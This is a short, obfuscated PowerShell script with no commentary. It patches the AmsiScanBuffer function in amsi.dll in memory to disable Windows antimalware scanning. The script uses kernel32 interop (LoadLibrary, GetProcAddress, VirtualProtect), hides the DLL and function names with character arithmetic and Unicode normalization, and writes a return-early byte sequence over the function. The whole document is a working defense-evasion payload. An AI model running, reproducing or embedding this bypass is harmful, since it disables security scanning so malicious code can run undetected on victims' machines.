$gk_iqZdph = @"
using System;
using System.Runtime.InteropServices;
public class gk_iqZdph {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr e9SXXOe, string kfD_ll_);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr c7S, UIntPtr QRXdJg_pGu3rWKw_Z, uint aDZDfxqZOJ, out uint cR2ff_EQ2rGj3n);
}
"@

Add-Type $gk_iqZdph

$sm_jHK2WLN = [gk_iqZdph]::LoadLibrary("$(('á'+'m'+'s'+'ì'+'.'+'d'+'l'+'l').NORMAlIzE([ChAR](54+16)+[cHAr]([byTe]0x6f)+[chaR](69+45)+[ChAR](109*6/6)+[ChAr](57+11)) -replace [ChAr]([BYtE]0x5c)+[cHAR](112)+[cHaR](123+67-67)+[ChaR](18+59)+[cHaR](110+94-94)+[ChAR](125))")
$m0i = [gk_iqZdph]::GetProcAddress($sm_jHK2WLN, "$(('Ämsí'+'Scän'+'Bûff'+'êr').NOrMAliZe([char](70*21/21)+[cHAR]([byte]0x6f)+[chaR]([ByTE]0x72)+[CHAr](109*10/10)+[chaR](68*53/53)) -replace [Char](92+12-12)+[chAr](112+84-84)+[CHaR]([ByTe]0x7b)+[chAr](77+35-35)+[Char]([byte]0x6e)+[cHAr]([byTE]0x7d))")
$p = 0
[gk_iqZdph]::VirtualProtect($m0i, [uint32]5, 0x40, [ref]$p)
$QjQczzEVRwo = "0xB8"
$h0BgWbu5 = "0x57"
$zBKQ1pCt = "0x00"
$X_y9 = "0x07"
$Q1sxKS = "0x80"
$cwPk63 = "0xC3"
$tnSDvJTTsXZExa = [Byte[]] ($QjQczzEVRwo,$h0BgWbu5,$zBKQ1pCt,$X_y9,+$Q1sxKS,+$cwPk63)
[System.Runtime.InteropServices.Marshal]::Copy($tnSDvJTTsXZExa, 0, $m0i, 6)